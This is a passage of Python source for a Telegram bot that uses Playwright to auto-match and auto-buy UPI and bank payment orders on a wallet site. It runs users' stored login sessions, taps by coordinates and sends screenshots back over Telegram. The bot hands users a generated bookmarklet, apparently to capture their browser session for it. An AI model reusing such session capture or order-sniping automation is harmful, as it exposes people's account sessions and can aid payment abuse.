                    const btns = Array.from(document.querySelectorAll('button, div, span')).filter(
                        el => (el.innerText || '').trim() === 'Match Again' && el.offsetParent !== null
                    );
                    return { isSearching: hasSearching, isNoMatch: hasNoMatch && !hasSearching, hasButton: btns.length > 0 };
                }
            """)
            if ui_state.get("isSearching"):
                await asyncio.sleep(2)
                continue
            if ui_state.get("isNoMatch") or ui_state.get("hasButton"):
                await asyncio.sleep(2)
                if session_key not in user_sessions or not user_sessions[session_key]["running"]:
                    break
                btn = page.locator('text="Match Again"')
                if await btn.count() > 0:
                    box = await btn.first.bounding_box()
                    if box:
                        await page.touchscreen.tap(box['x'] + box['width']/2, box['y'] + box['height']/2)
                    else:
                        await btn.first.click(force=True, timeout=2000)
                else:
                    await page.touchscreen.tap(195, 510)
                await asyncio.sleep(3.0)
                if await check_is_login_page(page):
                    s = user_sessions.get(session_key)
                    if s:
                        await send_login_expired_alert(s["chat_id"], s["phone"], session_key, page, context)
                    break
                after_text = await page.inner_text("body")
                if any(k in after_text for k in ["Countdown to Expiry", "Use Mobile Scan code", "Matched, pending payment"]):
                    await send_order_matched_alert(session_key, page, context, after_text)
                    break
                phone = user_sessions[session_key].get("phone", "")
                shot = await page.screenshot()
                try:
                    await context.bot.send_photo(user_sessions[session_key]["chat_id"], photo=shot, caption=f"🔄 **Round #{round_count} Matching Start!** ({phone})", disable_notification=True)
                except Exception:
                    pass
                round_count += 1
                await asyncio.sleep(15)
                continue
            await asyncio.sleep(2)
        except Exception:
            if session_key in user_sessions and user_sessions[session_key]["running"]:
                await asyncio.sleep(2)
            else:
                break

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    await query.answer()

    if data == "check_join":
        is_joined = await is_member_of_group(user_id, context)
        if is_joined:
            await query.answer("✅ Membership Verified!", show_alert=True)
            await start_cmd(update, context)
        else:
            await query.answer("❌ Abhi tak join nahi kiya hai! Pehle group join karein.", show_alert=True)
        return

    if not await is_member_of_group(user_id, context):
        await start_cmd(update, context)
        return

    if not check_user_daily_limit(user_id):
        await query.answer("Daily Limit Reached!", show_alert=True)
        await start_cmd(update, context)
        return

    if data.startswith("orderrepeat_"):
        phone = data.replace("orderrepeat_", "")
        s_key = f"{chat_id}_{phone}"
        confs = load_last_configs().get(phone, {})
        p_tab = confs.get("tab", "OTP-UPI")
        p_range = confs.get("range", "2001-2999")
        p_app = confs.get("app", "PhonePe")
        try:
            await query.edit_message_caption(
                caption=f"🔁 **REPEAT ORDER STARTED!**\n\n📱 **Account:** `{phone}`\n🚀 **Auto-Matching:** [{p_tab}] {p_range} ({p_app})...",
                reply_markup=None, parse_mode="Markdown"
            )
        except Exception:
            pass
        accounts = get_user_accounts(user_id)
        session_data = accounts.get(phone)
        if s_key in user_sessions:
            await stop_single_session(s_key, context, notify=False)
        if session_data:
            asyncio.create_task(run_direct_session(chat_id, phone, session_data, context, auto_start_matching=True))
        return

    if data == "stop_all":
        await query.edit_message_text("⏳ Saare running sessions close ho gaye.")
        await stop_all_user_sessions(chat_id, context)
        return

    if data.startswith("stop_"):
        phone = data.replace("stop_", "")
        s_key = f"{chat_id}_{phone}"
        await query.edit_message_text(f"⏳ Stopping {phone}...")
        await stop_single_session(s_key, context)
        return

    if data.startswith("choose_"):
        phone = data.replace("choose_", "")
        confs = load_last_configs().get(phone)
        buttons = []
        if confs:
            buttons.append([InlineKeyboardButton(f"🔁 Repeat ({confs.get('tab')} | {confs.get('range')} | {confs.get('app')})", callback_data=f"repeat_{phone}")])
        buttons.append([InlineKeyboardButton("⚙️ New Setup (Select Range)", callback_data=f"run_{phone}")])
        buttons.append([InlineKeyboardButton("🔙 Back", callback_data="back_start")])
        await query.edit_message_text(f"📱 **Account: `{phone}`**\n\nKaise match karna chahte hain?", reply_markup=InlineKeyboardMarkup(buttons), parse_mode="Markdown")
        return

    if data == "back_start":
        await start_cmd(update, context)
        return

    if data.startswith("repeat_"):
        phone = data.replace("repeat_", "")
        s_key = f"{chat_id}_{phone}"
        accounts = get_user_accounts(user_id)
        session_data = accounts.get(phone)
        if not session_data:
            bm = generate_user_bookmarklet(chat_id, phone)
            await query.edit_message_text(f"⚠️ **`{phone}` Session Missing!**\nBookmark run karein:\n`{bm}`", parse_mode="Markdown")
            return
        active_keys = get_active_sessions_for_user(chat_id)
        if len(active_keys) >= 1 and s_key not in active_keys:
            await stop_single_session(active_keys[0], context, notify=False)
        if s_key in user_sessions:
            await stop_single_session(s_key, context, notify=False)
        confs = load_last_configs().get(phone, {})
        p_tab, p_range, p_app = confs.get("tab", "OTP-UPI"), confs.get("range", "2001-2999"), confs.get("app", "PhonePe")
        await query.edit_message_text(f"🚀 **Fast Repeat Matching!**\n📱 `{phone}`\n📂 [{p_tab}] {p_range} ({p_app})...", parse_mode="Markdown")
        asyncio.create_task(run_direct_session(chat_id, phone, session_data, context, auto_start_matching=True))
        return

    if data.startswith("run_"):
        phone = data.split("_")[1]
        s_key = f"{chat_id}_{phone}"
        accounts = get_user_accounts(user_id)
        session_data = accounts.get(phone)
        if not session_data:
            bm = generate_user_bookmarklet(chat_id, phone)
            await query.edit_message_text(f"⚠️ **`{phone}` Session Missing!**\nBookmark run karein:\n`{bm}`", parse_mode="Markdown")
            return
        active_keys = get_active_sessions_for_user(chat_id)
        if len(active_keys) >= 1 and s_key not in active_keys:
            await stop_single_session(active_keys[0], context, notify=False)
        if s_key in user_sessions:
            await stop_single_session(s_key, context, notify=False)
        await query.edit_message_text(f"⏳ **`{phone}`** browser start ho raha hai...", parse_mode="Markdown")
        asyncio.create_task(run_direct_session(chat_id, phone, session_data, context))

    elif data.startswith("tab_"):
        parts = data.split("_")
        t_tab, phone = parts[1], parts[2]
        s_key = f"{chat_id}_{phone}"
        user_tab_selection[s_key] = t_tab
        if s_key not in user_sessions:
            await query.edit_message_text("Session expire ho gaya. /start karein.")
            return
        page = user_sessions[s_key]["page"]
        if await check_is_login_page(page):
            await send_login_expired_alert(chat_id, phone, s_key, page, context, query)
            return
        try:
            await switch_tab(page, t_tab)
        except Exception:
            pass
        ranges = RANGES_BANK if t_tab == "BANK" else RANGES_OTP
        buttons, row = [], []
        for r in ranges:
            row.append(InlineKeyboardButton(f"₹ {r}", callback_data=f"range_{r}_{phone}"))
            if len(row) == 2:
                buttons.append(row); row = []
        if row:
            buttons.append(row)
        buttons.append([InlineKeyboardButton(f"⛔ Stop {phone}", callback_data=f"stop_{phone}")])
        await query.edit_message_text(f"✅ **`{phone}`** (Tab: {t_tab})\n\n2️⃣ Kaunsi **Range** me match karna hai?", reply_markup=InlineKeyboardMarkup(buttons), parse_mode="Markdown")

    elif data.startswith("range_"):
        parts = data.split("_")
        range_val, phone = parts[1], parts[2]
        s_key = f"{chat_id}_{phone}"
        user_range_selection[s_key] = range_val
        cur_tab = user_tab_selection.get(s_key, "OTP-UPI")
        if s_key not in user_sessions:
            await query.edit_message_text("Session expire ho gaya. /start karein.")
            return
        page = user_sessions[s_key]["page"]
        if await check_is_login_page(page):
            await send_login_expired_alert(chat_id, phone, s_key, page, context, query)
            return
        await query.edit_message_text(f"⏳ **`{phone}`**: Scanning options...", parse_mode="Markdown")
        await select_and_strictly_verify_tag(page, range_val)
        await asyncio.sleep(1.5)
        buy_tapped = False
        buys = page.locator('button:has-text("Buy"), div:has-text("Buy")')
        for i in range(await buys.count()):
            box = await buys.nth(i).bounding_box()
            if box and box['y'] > 300 and box['x'] > 200:
                await page.touchscreen.tap(box['x'] + box['width']/2, box['y'] + box['height']/2)
                buy_tapped = True
                break
        if not buy_tapped:
            await page.touchscreen.tap(350, 420)
        await asyncio.sleep(2.0)
        if await check_is_login_page(page):
            await send_login_expired_alert(chat_id, phone, s_key, page, context, query)
            return
        live_apps = await detect_live_payment_options(page)
        buttons, row = [], []
        for app in live_apps:
            row.append(InlineKeyboardButton(app, callback_data=f"pay_{app}_{phone}"))
            if len(row) == 2:
                buttons.append(row); row = []
        if row:
            buttons.append(row)
        buttons.append([InlineKeyboardButton(f"⛔ Stop {phone}", callback_data=f"stop_{phone}")])
        await query.edit_message_text(f"✅ **`{phone}`**\n📂 Tab: {cur_tab} | 💰 Range: {range_val}\n\n3️⃣ Payment Option chunein:", reply_markup=InlineKeyboardMarkup(buttons), parse_mode="Markdown")

    elif data.startswith("pay_"):
        parts = data.split("_")
        app_name, phone = parts[1], parts[2]
        s_key = f"{chat_id}_{phone}"
        if s_key not in user_sessions:
            await query.edit_message_text("Session expire ho gaya. /start karein.")
            return
        target_range = user_range_selection.get(s_key, "2001-2999")
        target_tab = user_tab_selection.get(s_key, "OTP-UPI")
        user_pay_selection[s_key] = app_name
        save_last_config(phone, target_tab, target_range, app_name)
        await query.edit_message_text(f"⏳ **`{phone}`** ({app_name}): Starting match...", parse_mode="Markdown")
        page = user_sessions[s_key]["page"]
        try:
            await click_strictly_another_account(page, app_name)
            await asyncio.sleep(2.5)
            if await check_is_login_page(page):
                await send_login_expired_alert(chat_id, phone, s_key, page, context, query)
                return
            check_txt = await page.inner_text("body")
            if any(k in check_txt for k in ["Countdown to Expiry", "Use Mobile Scan code", "Input or Paste UTR", "Matched, pending payment"]):
                await send_order_matched_alert(s_key, page, context, check_txt)
                return
            start_shot = await page.screenshot()
            if "Matching" in check_txt or "Searching available orders" in check_txt:
                await context.bot.send_photo(chat_id, photo=start_shot, caption=f"🚀 **Round #1 Matching Start!** ({phone} | {target_tab}: {target_range} | {app_name})", disable_notification=True)
                asyncio.create_task(matching_monitor(s_key, page, context))
            else:
                await context.bot.send_photo(chat_id, photo=start_shot, caption=f"⚠️ Status check ({phone}):", disable_notification=True)
        except Exception as e:
            await context.bot.send_message(chat_id, f"❌ Error ({phone}): {str(e)}")

async def post_init_setup(app: Application):
    async def loop_sync():
        while True:
            await asyncio.sleep(2.5)
            try:
                await poll_bookmark_sync(app)
            except Exception:
                pass
    asyncio.create_task(loop_sync())

def main():
    threading.Thread(target=run_dummy_server, daemon=True).start()
    app = Application.builder().token(BOT_TOKEN).post_init(post_init_setup).build()
    
    conv_handler = ConversationHandler(
        entry_points=[
            CallbackQueryHandler(add_acc_callback, pattern="^add_acc$"),
        ],
        states={
            ASK_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND & filters.ChatType.PRIVATE, get_phone)],
            ASK_SESSION: [MessageHandler((filters.TEXT | filters.Document.ALL) & ~filters.COMMAND & filters.ChatType.PRIVATE, get_session)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conv, filters=filters.ChatType.PRIVATE), CommandHandler("start", start_cmd, filters=filters.ChatType.PRIVATE)],
        allow_reentry=True
    )
    
    app.add_handler(CommandHandler("start", start_cmd, filters=filters.ChatType.PRIVATE))
    app.add_handler(CommandHandler("detail", detail_cmd, filters=filters.ChatType.PRIVATE))
    app.add_handler(CommandHandler("setcode", setcode_cmd, filters=filters.ChatType.PRIVATE))
    app.add_handler(conv_handler)
    app.add_handler(CommandHandler("stop", stop_cmd, filters=filters.ChatType.PRIVATE))
    app.add_handler(MessageHandler(filters.TEXT & filters.ChatType.PRIVATE, text_or_command_handler))
    app.add_handler(CallbackQueryHandler(button_handler))
    
    print("✅ AR Wallet Free Trial Bot Live...")
    app.run_polling()

if __name__ == "__main__":
    main()
